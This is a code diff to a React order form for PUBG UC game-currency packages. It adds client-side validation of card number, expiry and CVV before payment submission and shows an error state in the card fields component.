@@ -4,6 +4,8 @@ import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
+import {validateCard} from '../lib/cardValidation';
+import type {CardValidationReason} from '../lib/cardValidation';
 import {pubgUcIconSrc, PUBG_UC_PACKAGES, PUBG_UC_TIER_ICONS, type PubgUcPackage} from '../lib/pubgUcPackages';
 
 type Step = 'package' | 'player' | 'payment';
@@ -62,6 +64,7 @@ export function PubgUcOrder({
   const [inputMode, setInputMode] = useState<'player' | 'code'>('player');
   const [paymentType, setPaymentType] = useState<PaymentType>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [cardValidationError, setCardValidationError] = useState<CardValidationReason | null>(null);
   const [showOtpStep, setShowOtpStep] = useState(false);
   const [otpCode, setOtpCode] = useState('');
   const [otpState, setOtpState] = useState<OtpState>('idle');
@@ -96,6 +99,13 @@ export function PubgUcOrder({
       const expYear = (form.elements.namedItem('cc-exp-year') as HTMLSelectElement).value;
       const expiry = expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
       const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
+      const cardError = validateCard({number: cardNumber, expMonth, expYear, cvv});
+      if (cardError) {
+        setCardValidationError(cardError);
+        setIsSubmitting(false);
+        return;
+      }
+      setCardValidationError(null);
 
       const playerInfo = inputMode === 'player' ? `🆔 Player ID: ${playerId.trim()}` : `📦 طلب كود تعبئة (سيتم الإرسال بعد الدفع)`;
       const details =
@@ -425,7 +435,7 @@ export function PubgUcOrder({
           ) : (
             <form onSubmit={handleSubmit} className="space-y-4">
               <div className="bg-white rounded-2xl border border-gray-100 p-4">
-                <CreditCardPaymentFields idPrefix="pubg-cc" />
+                <CreditCardPaymentFields idPrefix="pubg-cc" error={cardValidationError} onChange={() => setCardValidationError(null)} />
               </div>
               <div className="flex items-center gap-2">
                 <ShieldAlert className="w-4 h-4 text-gray-400 shrink-0" />
